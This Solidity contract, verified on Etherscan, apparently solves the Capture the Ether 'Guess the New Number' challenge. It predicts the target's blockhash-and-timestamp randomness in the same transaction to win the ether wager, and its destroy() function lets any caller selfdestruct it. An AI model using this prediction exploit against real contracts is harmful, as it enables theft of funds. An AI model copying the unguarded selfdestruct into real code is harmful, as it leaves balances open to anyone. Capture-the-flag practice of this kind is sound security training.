/**
 *Submitted for verification at Etherscan.io on 2022-01-09
*/

pragma solidity ^0.4.21;

contract GuessTheNewNumberChallengeInterface {
    function isComplete() public view returns (bool);
    function guess(uint8 n) public payable;
}

contract BlockAndWin {

    uint256 a;

    function activateGame(address _address, uint256 _a) public payable returns (bool) {
        require(msg.value == 1 ether);

        GuessTheNewNumberChallengeInterface game = GuessTheNewNumberChallengeInterface(_address);
        game.guess.value(msg.value)(
            uint8(
                uint256(
                    keccak256(
                        block.blockhash(block.number - 1), 
                        now
                    )
                )
            )
        );
        a = _a;
        
        return game.isComplete();
    }

    function destroy() public {
        selfdestruct(msg.sender);
    }

}